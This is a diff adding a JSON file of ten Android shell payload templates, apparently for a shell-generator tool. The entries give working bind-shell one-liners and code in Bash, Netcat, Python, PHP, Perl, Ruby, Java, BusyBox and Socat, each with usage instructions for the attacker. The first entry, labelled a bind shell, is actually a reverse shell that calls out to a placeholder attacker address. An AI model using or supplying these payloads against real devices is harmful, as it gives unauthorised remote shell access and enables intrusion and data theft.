@@ -1,0 +1,84 @@
+{
+  "payloads": [
+    {
+      "os": "Android",
+      "language": "Bash",
+      "description": "Basic Bash bind shell using /dev/tcp on Android with BusyBox.",
+      "template": "sh -i > /dev/tcp/{ip}/{port} 0<&1 2>&1",
+      "usage": "Start a listener on attacker's machine: nc {ip} {port}",
+      "tags": ["bind_tcp", "bash", "busybox", "interactive", "fileless", "one-liner"]
+    },
+    {
+      "os": "Android",
+      "language": "Netcat",
+      "description": "Netcat bind shell using -e flag to execute sh on Android.",
+      "template": "nc -lvnp {port} -e /system/bin/sh",
+      "usage": "Connect to the target with: nc {ip} {port}",
+      "tags": ["bind_tcp", "netcat", "interactive", "simple"]
+    },
+    {
+      "os": "Android",
+      "language": "Netcat",
+      "description": "Netcat bind shell using FIFO for environments without -e support.",
+      "template": "rm /data/local/tmp/f; mkfifo /data/local/tmp/f; cat /data/local/tmp/f | /system/bin/sh -i 2>&1 | nc -lvp {port} > /data/local/tmp/f",
+      "usage": "Run on target device. Attacker connects with: nc {ip} {port}",
+      "tags": ["bind_tcp", "netcat", "fifo", "interactive", "fileless"]
+    },
+    {
+      "os": "Android",
+      "language": "Python",
+      "description": "Python bind shell using socket and subprocess to spawn shell.",
+      "template": "python -c 'import socket,subprocess,os;s=socket.socket();s.bind((\"{ip}\",{port}));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0);os.dup2(conn.fileno(),1);os.dup2(conn.fileno(),2);subprocess.call([\"/system/bin/sh\"])'",
+      "usage": "Execute on Android. Connect with: nc {ip} {port}",
+      "tags": ["bind_tcp", "python", "interactive", "one-liner"]
+    },
+    {
+      "os": "Android",
+      "language": "PHP",
+      "description": "PHP bind shell for Android using socket interface.",
+      "template": "php -r '$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($s,\"{ip}\",{port});socket_listen($s,1);$c=socket_accept($s);while(1){$cmd=socket_read($c,2048);$out=shell_exec($cmd);socket_write($c,$out,strlen($out));}'",
+      "usage": "Run with PHP CLI or via webserver. Connect: nc {ip} {port}",
+      "tags": ["bind_tcp", "php", "script", "interactive"]
+    },
+    {
+      "os": "Android",
+      "language": "Perl",
+      "description": "Perl bind shell using sockets and exec for Android.",
+      "template": "perl -e 'use Socket;$p=getprotobyname(\"tcp\");socket(S,PF_INET,SOCK_STREAM,$p);bind(S,sockaddr_in({port},inet_aton(\"{ip}\")));listen(S,1);for(;accept(C,S);){open(STDIN,\">&C\");open(STDOUT,\">&C\");open(STDERR,\">&C\");exec(\"/system/bin/sh -i\");}'",
+      "usage": "Connect with: nc {ip} {port}",
+      "tags": ["bind_tcp", "perl", "interactive", "fileless"]
+    },
+    {
+      "os": "Android",
+      "language": "Ruby",
+      "description": "Ruby bind shell using TCPServer and popen on Android.",
+      "template": "ruby -rsocket -e 's=TCPServer.new(\"{ip}\",{port});c=s.accept;while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'",
+      "usage": "Run on device with Ruby interpreter. Connect using: nc {ip} {port}",
+      "tags": ["bind_tcp", "ruby", "interactive", "script"]
+    },
+    {
+      "os": "Android",
+      "language": "Java",
+      "description": "Java bind shell using ServerSocket and Runtime.exec.",
+      "template": "public class BindShell { public static void main(String[] args) throws Exception { java.net.ServerSocket s = new java.net.ServerSocket({port}); java.net.Socket c = s.accept(); Process p = Runtime.getRuntime().exec(\"/system/bin/sh\"); new Thread(() -> { try { java.io.InputStream in = c.getInputStream(); java.io.OutputStream out = p.getOutputStream(); byte[] b = new byte[1024]; int l; while ((l = in.read(b)) != -1) out.write(b, 0, l); } catch (Exception e) {} }).start(); java.io.InputStream in = p.getInputStream(); java.io.OutputStream out = c.getOutputStream(); byte[] b = new byte[1024]; int l; while ((l = in.read(b)) != -1) out.write(b, 0, l); } }",
+      "usage": "Compile with dx or use in APK. Connect via nc {ip} {port}",
+      "tags": ["bind_tcp", "java", "interactive", "apk", "android"]
+    },
+    {
+      "os": "Android",
+      "language": "BusyBox",
+      "description": "BusyBox bind shell using nc and /system/bin/sh.",
+      "template": "busybox nc -l -p {port} -e /system/bin/sh",
+      "usage": "Execute on Android with BusyBox installed. Connect: nc {ip} {port}",
+      "tags": ["bind_tcp", "busybox", "interactive", "fileless", "netcat"]
+    },
+    {
+      "os": "Android",
+      "language": "Socat",
+      "description": "Socat bind shell using Android binary to spawn shell.",
+      "template": "socat TCP-LISTEN:{port},reuseaddr,fork EXEC:/system/bin/sh",
+      "usage": "Run on target device. Connect using: nc {ip} {port}",
+      "tags": ["bind_tcp", "socat", "interactive", "fileless", "script"]
+    }
+  ]
+}
